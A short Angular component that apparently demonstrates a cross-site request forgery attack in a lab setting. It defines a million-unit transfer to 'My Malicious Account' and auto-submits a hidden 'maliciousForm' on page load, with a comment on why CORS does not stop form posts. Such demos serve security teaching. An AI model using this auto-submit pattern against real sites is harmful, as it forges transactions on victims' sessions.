import { Component } from '@angular/core';
import { environment } from '../../environments/environment.dev';
import { RouterOutlet } from '@angular/router';

@Component({
  selector: 'app-vulnerable-endpoint',
  standalone: true,
  imports: [RouterOutlet],
  templateUrl: './vulnerable-endpoint.component.html',
  styleUrl: './vulnerable-endpoint.component.css'
})
export class VulnerableEndpointComponent {
  protected apiUrl = environment.apiUrl;

  newTransaction = {
    amount: 1000000,
    destinationAccount: 'My Malicious Account'
  };
}


document.addEventListener("readystatechange", function() {
  //NOT Blocked by CORS
  /* When you submit a form using HTML, the browser handles the request 
  as a form submission, which is typically not subject to the same CORS 
  restrictions as AJAX requests. This is because form submissions are 
  considered a different type of request, known as a "simple request," 
  which includes GET and POST requests with certain content types 
  (like application/x-www-form-urlencoded, multipart/form-data, or text/plain).
  */

  if (document.readyState !== 'complete') {
    return;
  }

  var form = document.getElementById('maliciousForm')! as HTMLFormElement;
  if (form){
    form.submit();
  }

});
